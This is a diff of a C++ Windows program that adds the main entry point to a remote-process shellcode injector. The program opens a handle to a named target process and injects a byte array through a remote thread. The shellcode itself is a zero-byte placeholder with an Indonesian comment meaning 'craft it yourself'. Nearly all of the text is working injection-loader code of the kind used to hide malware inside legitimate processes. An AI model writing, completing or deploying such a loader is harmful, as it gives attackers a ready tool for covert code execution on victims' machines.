@@ -89,7 +89,40 @@ BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sS
 		std::wcerr << L"[!] CreateRemoteThread Failed with error : " << GetLastError() << std::endl;
 	}
 	std::wcout << L"[+] Shellcode thread successfully created" << std::endl;
+
 	WaitForSingleObject(hRemoteThread, INFINITE);
 	CloseHandle(hRemoteThread);
 	return TRUE;
+}
+
+int wmain(int argc, wchar_t* argv[]) {
+	if (argc != 2) {
+		std::wcerr << L"Usage : " << argv[0] << L"<target_process_name.exe>" << std::endl;
+		return 1;
+	}
+	DWORD dwProcessId = 0;
+	HANDLE hProcess = NULL;
+
+	if (!GetRemoteProcessHandle(argv[1], &dwProcessId, &hProcess)) {
+		std::wcerr << L"[!] Could not obtain handle to remote process" << std::endl;
+		return 1;
+	}
+
+	std::wcout << L"[+] Got Handle to process ID : " << dwProcessId << std::endl;
+
+	BYTE shellcode[]{
+		0x00, 0x00, 0x00, 0x00 //CRAFTING AJA SENDIRI
+	};
+	SIZE_T shellcodeSize = sizeof(shellcode);
+
+	if (!InjectShellcodeToRemoteProcess(hProcess, shellcode, shellcodeSize)) {
+		std::wcerr << L"[!] Shellcode injection Failed" << std::endl;
+		CloseHandle(hProcess);
+		return 1;
+	}
+
+	std::wcout << L"[+] Shellcode injection successfully" << std::endl;
+	CloseHandle(hProcess);
+	return 0;
+
 }
